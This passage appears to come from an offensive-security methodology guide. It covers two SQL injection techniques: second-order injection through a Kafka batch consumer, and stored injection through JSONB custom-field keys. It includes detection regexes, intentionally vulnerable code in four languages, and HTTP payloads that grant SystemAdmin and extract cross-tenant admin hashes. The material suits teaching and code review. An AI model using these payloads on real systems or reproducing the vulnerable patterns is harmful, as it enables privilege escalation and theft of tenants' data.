```regexp
\$sql\s*\.\=\s*sprintf\(.*INSERT\s+INTO|\$sql\s*=.*INSERT\s+INTO.*\$|sprintf\(.*VALUES.*%s
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
sql\s*\+=\s*`\('\$\{.*\}'\)`|`INSERT\s+INTO.*\$\{.*\}`|query\(.*INSERT\s+INTO.*\$\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TelemetryBatchConsumer : IMessageConsumer<List<TelemetryEvent>>
{
    private readonly IDbConnection _db;

    public async Task ConsumeAsync(List<TelemetryEvent> events)
    {
        // [1]
        // [2]
        var sql = new StringBuilder("INSERT INTO TelemetryData (DeviceId, Timestamp, Payload) VALUES ");

        for (int i = 0; i < events.Count; i++)
        {
            var evt = events[i];
            
            // [3]
            // [4]
            sql.AppendFormat("('{0}', '{1}', '{2}')", evt.DeviceId, evt.Timestamp, evt.Payload);

            if (i < events.Count - 1) sql.Append(", ");
        }

        await _db.ExecuteAsync(sql.ToString());
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class TelemetryBatchConsumer {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @KafkaListener(topics = "telemetry-events", containerFactory = "batchFactory")
    public void consume(List<TelemetryEvent> events) {
        // [1]
        // [2]
        StringBuilder sql = new StringBuilder("INSERT INTO telemetry_data (device_id, timestamp, payload) VALUES ");

        for (int i = 0; i < events.size(); i++) {
            TelemetryEvent evt = events.get(i);
            
            // [3]
            // [4]
            sql.append(String.format("('%s', '%s', '%s')", evt.getDeviceId(), evt.getTimestamp(), evt.getPayload()));

            if (i < events.size() - 1) {
                sql.append(", ");
            }
        }

        jdbcTemplate.execute(sql.toString());
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TelemetryBatchConsumer implements ShouldQueue
{
    protected $db;

    public function handle(array $events)
    {
        // [1]
        // [2]
        $sql = "INSERT INTO telemetry_data (device_id, timestamp, payload) VALUES ";

        $values = [];
        foreach ($events as $evt) {
            // [3]
            // [4]
            $values[] = sprintf("('%s', '%s', '%s')", $evt['device_id'], $evt['timestamp'], $evt['payload']);
        }

        $sql .= implode(', ', $values);
        
        $this->db->statement($sql);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TelemetryBatchConsumer {
    static async consume(events) {
        // [1]
        // [2]
        let sql = "INSERT INTO telemetry_data (device_id, timestamp, payload) VALUES ";
        let values = [];

        for (let evt of events) {
            // [3]
            // [4]
            values.push(`('${evt.deviceId}', '${evt.timestamp}', '${evt.payload}')`);
        }

        sql += values.join(', ');
        
        await db.query(sql);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application processes data in massive background batches to decouple the synchronous API ingestion from database latency, \[2] The developer implements a custom SQL String Builder to execute a multi-row insert. This explicitly bypasses the ORM to achieve performance goals that parameterized batches cannot meet in legacy frameworks, \[3] The architecture relies entirely on the synchronous API Gateway's JSON Schema Validator to enforce data cleanliness. The worker fundamentally assumes that anything successfully dequeued from Kafka is implicitly secure, \[4] The fatal trust boundary transition. Because the API validated the payload's syntax but not its semantic SQL context (expecting a downstream ORM to handle that), the raw, unescaped string is concatenated directly into the execution command. The attacker's payload survives the Kafka queue and detonates asynchronously as Second-Order SQL Injection

```http
// 1. Attacker interacts with the high-throughput, asynchronous ingestion endpoint.
// 2. Attacker injects a completely valid JSON payload. Inside the string, they craft 
// the SQL syntax breaker to terminate the current VALUES tuple, end the INSERT statement, 
// and append a new, highly privileged UPDATE statement.

POST /api/v1/telemetry/ingest HTTP/1.1
Host: iot.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{
  "deviceId": "ATTACKER_DEVICE",
  "timestamp": "2026-07-12T10:00:00Z",
  "payload": "dummy_data'); UPDATE users SET role = 'SystemAdmin' WHERE id = 991; -- "
}

// 3. The API Gateway validates the JSON syntax and returns 202 Accepted.
HTTP/1.1 202 Accepted
{"status": "queued"}

// 4. Ten seconds later, the background worker drains the Kafka queue.
// It constructs the following raw SQL string:
// INSERT INTO telemetry_data (device_id, timestamp, payload) VALUES ('ATTACKER_DEVICE', '2026-07-12T10:00:00Z', 'dummy_data'); UPDATE users SET role = 'SystemAdmin' WHERE id = 991; -- ')

// 5. The database executes the payload. The background worker's high-privileged service account executes the appended UPDATE command, permanently granting the attacker administrative access.
```
{% endstep %}

{% step %}
To fulfill the business requirement of processing millions of telemetry events without establishing massive database clusters, engineers optimized the background database write pipeline. By abandoning the slow, secure ORM layer in favor of raw SQL string concatenation, they introduced a structural vulnerability. They erroneously assumed that the asynchronous boundary (the Kafka queue) and the API's JSON schema validation implicitly sanitized the data. The attacker bypassed the API security by encapsulating raw SQL syntax perfectly within a valid JSON string. The payload rested dormant inside the message queue. When the background consumer pulled the batch, it evaluated the untrusted string as executable code, silently compromising the database's integrity and allowing the attacker to elevate their privileges entirely out-of-band
{% endstep %}
{% endstepper %}

***

#### SQL Injection via Dynamic JSONB Path Traversal in Multi-Tenant Schemas

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus heavily on enterprise SaaS platforms that allow users or tenant administrators to define "Custom Fields" or "Dynamic Schemas" for their specific organization (e.g., custom attributes on a CRM contact profile)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Schema-less SQL" architecture. Modern enterprise platforms avoid generating physical SQL columns for every newly created custom field. Instead, they store all dynamic fields inside a single `JSON` or `JSONB` column (e.g., `PostgreSQL JSONB`, `MySQL JSON`)
{% endstep %}

{% step %}
Investigate the API endpoint responsible for filtering or querying records based on these dynamic custom fields (e.g., `GET /api/v1/contacts?customField[LoyaltyTier]=Gold`)
{% endstep %}

{% step %}
Discover the database querying bottleneck: Standard ORM functions struggle to natively generate efficient query execution plans for deeply nested JSON paths, often resulting in full table scans
{% endstep %}

{% step %}
Observe the optimization: To utilize advanced JSON indexes (e.g., GIN indexes in Postgres), the backend developer constructs the raw JSON path extraction operator (e.g., `->>` or `$.`) using raw SQL interpolation
{% endstep %}

{% step %}
Locate the dynamic query builder in the decompiled codebase. Notice that the developer securely parameterizes the _value_ of the search (e.g., `Gold`), but explicitly concatenates the _key_ (e.g., `LoyaltyTier`) directly into the JSON path string because SQL databases do not permit binding JSON keys via prepared statements
{% endstep %}

{% step %}
Understand the architectural assumption: The developer believes that because the Custom Field _keys_ are defined exclusively by Tenant Administrators during the initial workspace setup, they are highly trusted, immutable schema definitions
{% endstep %}

{% step %}
Identify the trust boundary collapse: The attacker, operating as a Tenant Administrator within their own isolated workspace, has the authority to define custom field names
{% endstep %}

{% step %}
Authenticate as a Tenant Administrator. Create a new custom field. Instead of naming it `LoyaltyTier`, inject a payload designed to break out of the JSON string literal and append an arbitrary SQL condition (e.g., `LoyaltyTier'}') = 'Gold' OR 1=1 --`)
{% endstep %}

{% step %}
Attempt to query the dynamic data grid using your poisoned custom field key
{% endstep %}

{% step %}
The backend extracts your malicious key from the system configuration, interpolates it directly into the raw JSON path extraction operator, and executes the query
{% endstep %}

{% step %}
Your payload breaks the JSON boundary and alters the overarching SQL statement. By utilizing `UNION SELECT` or boolean inferencing, escalate your privileges to exfiltrate the raw database schemas and records of entirely isolated cross-tenant organizations

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:FromSqlRaw\s*\([\s\S]{0,150}?->>\s*'\s*\+|FromSqlInterpolated\s*\([\s\S]{0,150}?->>|JsonDocument[\s\S]{0,120}?GetProperty\s*\(\s*.*\+)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:JSON_EXTRACT\s*\([\s\S]{0,120}?'\$\.\s*\+|JSON_VALUE\s*\([\s\S]{0,120}?'\$\.\s*\+|->>\s*'\s*\+\s*customKey|String\.format\s*\(.*JSON)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:JSON_EXTRACT\s*\([\s\S]{0,120}?'\$\.\s*\.\s*\$|->>\s*'\s*\.\s*\$customKey|json_decode[\s\S]{0,100}?\$key|sprintf\s*\(.*JSON_EXTRACT)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:JSON_EXTRACT\s*\([\s\S]{0,120}?'\$\.\s*\+|->>\s*`\$\{customKey\}`|->>\s*['"`]\s*\+\s*customKey|query\s*\(`.*JSON.*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
FromSqlRaw.*->>\s*'\s*\+
```
{% endtab %}

{% tab title="Java" %}
```regexp
JSON_EXTRACT.*'\$\.\s*\+|->>'\s*\+\s*customKey
```
{% endtab %}

{% tab title="PHP" %}
```regexp
JSON_EXTRACT.*'\$\.\s*\.\s*\$|->>'\s*\.\s*\$customKey
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
JSON_EXTRACT.*'\$\.\s*\+|->>'\$\{customKey\}|->>\s*['"`]\s*\+\s*customKey
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/crm/contacts")]
public async Task<IActionResult> GetContacts([FromQuery] string customKey, [FromQuery] string customValue) 
{
    // [1]
    // [2]
    var tenantCustomFields = await _configService.GetAllowedCustomFieldsAsync(_currentUser.TenantId);
    
    if (!tenantCustomFields.Contains(customKey)) 
    {
        return BadRequest("Invalid Custom Field");
    }

    // [3]
    // [4]
    // PostgreSQL JSONB extraction operator ->>
    var query = _context.Contacts
        .FromSqlRaw($"SELECT * FROM Contacts WHERE TenantId = @p0 AND CustomData->>'{customKey}' = @p1", 
                    _currentUser.TenantId, customValue);

    var results = await query.ToListAsync();
    return Ok(results);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/crm/contacts")
public ResponseEntity<?> getContacts(@RequestParam String customKey, @RequestParam String customValue) {
    // [1]
    // [2]
    List<String> tenantCustomFields = configService.getAllowedCustomFields(currentUser.getTenantId());
    
    if (!tenantCustomFields.contains(customKey)) {
        return ResponseEntity.badRequest().body("Invalid Custom Field");
    }

    // [3]
    // [4]
    // MySQL JSON extraction operator ->>
    String sql = "SELECT * FROM contacts WHERE tenant_id = ? AND custom_data->>'$." + customKey + "' = ?";
    
    Query query = entityManager.createNativeQuery(sql, Contact.class);
    query.setParameter(1, currentUser.getTenantId());
    query.setParameter(2, customValue);

    return ResponseEntity.ok(query.getResultList());
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getContacts(Request $request) 
{
    $customKey = $request->query('customKey');
    $customValue = $request->query('customValue');

    // [1]
    // [2]
    $tenantCustomFields = $this->configService->getAllowedCustomFields($this->currentUser->tenantId);

    if (!in_array($customKey, $tenantCustomFields)) 
    {
        return response('Invalid Custom Field', 400);
    }

    // [3]
    // [4]
    $results = DB::select("SELECT * FROM contacts WHERE tenant_id = ? AND custom_data->>'{$customKey}' = ?", 
        [$this->currentUser->tenantId, $customValue]);

    return response()->json($results);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/crm/contacts', async (req, res) => {
    let customKey = req.query.customKey;
    let customValue = req.query.customValue;

    // [1]
    // [2]
    let tenantCustomFields = await configService.getAllowedCustomFields(req.user.tenantId);

    if (!tenantCustomFields.includes(customKey)) {
        return res.status(400).send("Invalid Custom Field");
    }

    // [3]
    // [4]
    let sql = `SELECT * FROM contacts WHERE tenant_id = ? AND custom_data->>'$.${customKey}' = ?`;
    
    let results = await db.query(sql, [req.user.tenantId, customValue]);

    res.json(results);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To deliver enterprise flexibility without executing schema migrations for every new customer, the architecture consolidates dynamic customer data into a highly indexed NoSQL-style JSON block within the relational database, \[2] The backend enforces a strict logical boundary. It verifies that the requested custom field key was explicitly defined and approved by the Tenant Administrator in the workspace configuration settings, ostensibly preventing parameter tampering, \[3] The architecture securely binds the dynamically submitted _value_ using parameterized queries, \[4] The fatal cryptographic breakdown. The developer relies on string interpolation for the JSON key because standard SQL engines prohibit parameterized identifiers. By assuming the Tenant Administrator's schema definition is an inherently trusted infrastructure component, they introduced Stored SQL Injection via the configuration layer

```http
// 1. Attacker (operating as a Tenant Admin in their own isolated environment) configures a malicious Custom Field name.
// The payload is designed to break out of the JSON path literal and append a cross-tenant extraction query.
POST /api/v1/settings/custom-fields HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_admin_token>
Content-Type: application/json

{"fieldName": "dummy' = '1' UNION SELECT id, tenant_id, admin_hash, '1' FROM Users -- "}
```

```http
// 2. The configuration is saved. The malicious string is now an authorized key in the tenant's allowlist.
// 3. The attacker queries the CRM endpoint using the newly registered malicious key.
GET /api/v1/crm/contacts?customKey=dummy'+%3D+'1'+UNION+SELECT+id,+tenant_id,+admin_hash,+'1'+FROM+Users+--+&customValue=1 HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_admin_token>

// 4. The backend verifies the key exists in the allowlist, constructs the raw SQL, and executes it.
// SELECT * FROM Contacts WHERE TenantId = 'OrgA' AND CustomData->>'dummy' = '1' UNION SELECT id, tenant_id, admin_hash, '1' FROM Users -- ' = '1'

// 5. The server returns the entire cross-tenant database of administrative hashes.
HTTP/1.1 200 OK
Content-Type: application/json

[
  {"id": "system_admin", "name": "OrgB", "customData": "$2b$12$xyz..."},
  {"id": "sys_admin_2", "name": "OrgC", "customData": "$2b$12$abc..."}
]
```
{% endstep %}

{% step %}
To resolve the impedance mismatch between rigid SQL schemas and multi-tenant SaaS flexibility, the enterprise stored dynamic data in JSONB columns. To extract this data efficiently, developers generated native JSON path operators using string concatenation. They mitigated external manipulation by strictly validating requested keys against the tenant's predefined schema list. The attacker exploited this architecture by shifting the injection payload directly into the schema definition layer. Because the schema configuration engine lacked strict alphanumeric input validation, the attacker established a poisoned trust anchor. When the attacker subsequently queried the data, the backend safely matched the payload against the poisoned allowlist, blindly interpolated the syntax-breaking key into the SQL execution plan, and flawlessly bypassed the multi-tenant physical isolation boundaries
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
